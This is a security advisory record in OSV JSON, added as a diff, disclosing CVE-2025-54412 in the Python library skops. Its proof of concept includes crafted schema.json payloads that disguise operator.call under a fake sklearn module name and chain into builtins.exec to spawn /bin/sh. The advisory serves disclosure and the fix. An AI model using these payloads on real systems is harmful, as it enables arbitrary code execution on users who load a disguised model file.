@@ -1,0 +1,83 @@
+{
+  "id": "GHSA-m7f4-hrc6-fwg3",
+  "modified": "2025-07-29T23:54:37.846037Z",
+  "published": "2025-07-25T19:17:34Z",
+  "aliases": [
+    "CVE-2025-54412"
+  ],
+  "related": [
+    "CVE-2025-54413"
+  ],
+  "summary": "Skops has Inconsistent Trusted Type Validation that Enables Hidden `operator` Methods Execution",
+  "details": "## Summary\nAn inconsistency in `OperatorFuncNode` can be exploited to hide the execution of untrusted `operator.xxx` methods. This can then be used in a code reuse attack to invoke seemingly safe functions and escalate to arbitrary code execution with minimal and misleading trusted types.\n\n**Note:** This report focuses on `operator.call` as it appears to be the most interesting target, but the same technique applies to other `operator` methods. Moreover, focusing on a specific example is not necessary, the `operator.call` invocation was a zero-effort choice meant solely to demonstrate the issue. The key point is the **inconsistency** that allows a user to approve a type as trusted, while in reality enabling the execution of `operator.xxx`.\n\n\n\n## Details\n\nThe `OperatorFuncNode` allows calling methods belonging to the `operator` module and included in a trusted list of methods. However, what is returned by `get_untrusted_types` and checked during the `load` call is not exactly the same as what is actually called. Instead, it is something partially controlled by the model author. This means that the user checking the untrusted types can be tricked into thinking something benign is being used, while in reality the `operator.xxx` method is executed.\n\nLet’s look at the implementation of the `OperatorFuncNode`:\n\n```python\n# from io/_general.py:618-633\nclass OperatorFuncNode(Node):\n    def __init__(\n        self,\n        state: dict[str, Any],\n        load_context: LoadContext,\n        trusted: Optional[Sequence[str]] = None,\n    ) -\u003e None:\n        super().__init__(state, load_context, trusted)\n        self.trusted = self._get_trusted(trusted, [])\n        self.children[\"attrs\"] = get_tree(state[\"attrs\"], load_context, trusted=trusted)\n\n    def _construct(self):\n        op = getattr(operator, self.class_name)\n        attrs = self.children[\"attrs\"].construct()\n        return op(*attrs)\n```\n\nAs you can see, what is called during construction is `operator.class_name`, where `class_name` is the value of the `\"__class__\"` key in the `schema.json` file of the `model.skops`. However, what is returned by `get_untrusted_types` and checked during `load` is the concatenation of the `__module__` and `__class__` keys. Interestingly, `__module__` is not used in the construction of the `OperatorFuncNode`, allowing an attacker to forge a module name that, when concatenated with the `__class__` name, seems harmless and related to the model being loaded, while actually calling the `operator.class_name` function.\n\nFor example, an attacker can create a `schema.json` file with the following content:\n\n```json\n{\n  \"__class__\": \"call\",\n  \"__module__\": \"sklearn.linear_model._stochastic_gradient.SGDRegressor\",\n  \"__loader__\": \"OperatorFuncNode\",\n  ...\n}\n```\n\nWhat is returned by `get_untrusted_types` and checked during `load` is `\"sklearn.linear_model._stochastic_gradient.SGDRegressor.call\"`, which seems harmless and related to the model being loaded. However, what is actually called during the construction of the `OperatorFuncNode` is `operator.call`, which can be used to call arbitrary functions with the provided arguments.\n\n**NOTE:** There is also the possibility of a collision with a real method ending with `.call`. If, at some point, the user needs to trust a type like `something.somewhere.call`, then the attacker can use the same name while actually executing `operator.call`. This also means that, if at any point `skops` adds a default trusted element named `call`, the attacker can use it to execute arbitrary code by invoking `operator.call` with the provided arguments.\n\n## PoC\n\nAs an example, to create a model that seems perfectly harmless but allows fully arbitrary code execution, reuse code of the `skops.io.loads` function from the `skops` library. This function was chosen because, even though it is not in the default trusted list of `skops`, it appears perfectly harmless and appropriate in the context of loading a model with `skops`, hence it is likely to be trusted by users.\n\nIn particular, the `OperatorFuncNode` is combined with the `skops.io.loads` function to create a model (`model.skops`) that, when loaded, executes a second model load using another, hidden model zipped into the original `model.skops` file (hence not visible to the user unless manually unzipped and inspected). The second model is loaded with controlled arguments, allowing the attacker to specify any trusted list, thereby enabling arbitrary code execution.\n\n### Zip file structure\n\nThe zip file `model.skops` has the following structure:\n\n```\nmodel.skops\n├── schema.json\n├── my-model-evil.skops\n    └── schema.json\n```\n\n### Payload\n\nThe `schema.json` file of `model.skops` is as follows:\n\n```json\n{\n  \"__class__\": \"call\",\n  \"__module__\": \"sklearn.linear_model._stochastic_gradient.SGDRegressor\",\n  \"__loader__\": \"OperatorFuncNode\",\n  \"attrs\": {\n    \"__class__\": \"tuple\",\n    \"__module__\": \"builtins\",\n    \"__loader__\": \"TupleNode\",\n    \"content\": [\n      {\n        \"__class__\": \"loads\",\n        \"__module__\": \"skops.io\",\n        \"__loader__\": \"TypeNode\",\n        \"__id__\": 5\n      },\n      {\n        \"__class__\": \"bytes\",\n        \"__module__\": \"builtins\",\n        \"__loader__\": \"BytesNode\",\n        \"file\": \"my-model-evil.skops\",\n        \"__id__\": 6\n      },\n      {\n        \"__class__\": \"list\",\n        \"__module__\": \"builtins\",\n        \"__loader__\": \"ListNode\",\n        \"content\": [\n          {\n            \"__class__\": \"str\",\n            \"__module__\": \"builtins\",\n            \"__loader__\": \"JsonNode\",\n            \"content\": \"\\\"builtins.exec\\\"\"\n          },\n          {\n            \"__class__\": \"str\",\n            \"__module__\": \"builtins\",\n            \"__loader__\": \"JsonNode\",\n            \"content\": \"\\\"sk.call\\\"\"\n          }\n        ]\n      }\n    ],\n    \"__id__\": 8\n  },\n  \"__id__\": 10,\n  \"protocol\": 2,\n  \"_skops_version\": \"0.11.0\"\n}\n```\n\nInside the zip file `model.skops`, there is a file `my-model-evil.skops` with the following content:\n\n```json\n{\n  \"__class__\": \"call\",\n  \"__module__\": \"sk\",\n  \"__loader__\": \"OperatorFuncNode\",\n  \"attrs\": {\n    \"__class__\": \"tuple\",\n    \"__module__\": \"builtins\",\n    \"__loader__\": \"TupleNode\",\n    \"content\": [\n      {\n        \"__class__\": \"exec\",\n        \"__module__\": \"builtins\",\n        \"__loader__\": \"TypeNode\",\n        \"__id__\": 1\n      },\n      {\n        \"__class__\": \"str\",\n        \"__module__\": \"builtins\",\n        \"__loader__\": \"JsonNode\",\n        \"content\": \"\\\"import os; os.system('/bin/sh')\\\"\",\n        \"__id__\": 5,\n        \"is_json\": true\n      }\n    ],\n    \"__id__\": 8\n  },\n  \"__id__\": 10,\n  \"protocol\": 2,\n  \"_skops_version\": \"0.11.0\"\n}\n```\n\nSince the first model loads it, the second model is loaded with the attacker-controlled trusted list `[\"builtins.exec\", \"sk.call\"]`, allowing execution of the `exec` function with the provided argument without any further confirmation from the user. In this example, a shell command is executed, but the attacker can modify the payload to execute any arbitrary code.\n\n### What is shown when executing the payload\n\nSuppose a user loads the model with the following code:\n\n```python\nfrom skops.io import load, get_untrusted_types\n\nunknown_types = get_untrusted_types(file=\"model.skops\")\nprint(\"Unknown types\", unknown_types)\ninput(\"Press enter to load the model...\")\nloaded = load(\"model.skops\", trusted=unknown_types)\n```\n\nThe output will be:\n\n```\nUnknown types ['sklearn.linear_model._stochastic_gradient.SGDRegressor.call', 'skops.io.loads']\nPress enter to load the model...\n```\n\nThis shows that the user is tricked into believing the model is safe, with apparently legitimate types like `sklearn.linear_model._stochastic_gradient.SGDRegressor.call` and `skops.io.loads`, while in reality, a shell is executed.\n\n**This is just one example, but the same technique can be used to execute any arbitrary code with even more  misleading names.**\n\n### Possible Fix\n\n`get_untrusted_types` and `load` should verify what is actually called during the construction of the `OperatorFuncNode`, not just rely on the concatenation of the `__module__` and `__class__` keys, which do not reflect the true behavior in this case.\n\n## Impact\nAn attacker can exploit this vulnerability by crafting a malicious model file that, when loaded, requests trusted types that are different from those actually executed by the model. Potentially, this can escalate— as shown— to the execution of arbitrary code on the victim’s machine, requiring only the confirmation of a few seemingly safe types. The attack occurs at load time. This is particularly concerning given that `skops` is often used in collaborative environments and promotes a security-oriented policy.\n\n\n\n## Attachments\nThe complete PoC is available on GitHub at [io-no/CVE-2025-54412](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-54412).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "skops",
+        "purl": "pkg:pypi/skops"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.12.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1",
+        "0.1.dev0",
+        "0.10.0",
+        "0.11.0",
+        "0.2",
+        "0.3.0",
+        "0.4.0",
+        "0.5.0",
+        "0.6.0",
+        "0.7.0",
+        "0.7.post0",
+        "0.8.0",
+        "0.9.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-m7f4-hrc6-fwg3/GHSA-m7f4-hrc6-fwg3.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/skops-dev/skops/security/advisories/GHSA-m7f4-hrc6-fwg3"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54412"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/skops-dev/skops/commit/0aeca055509dfb48c1506870aabdd9e247adf603"
+    },
+    {
+      "type": "WEB",
+      "url": "https://drive.google.com/file/d/1c2KrjayE_S1siaou0vDmGK7_MQ7_YCUZ/view?usp=sharing"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-54412"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/skops-dev/skops"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/skops-dev/skops/releases/tag/v0.12.0"
+    }
+  ]
+}
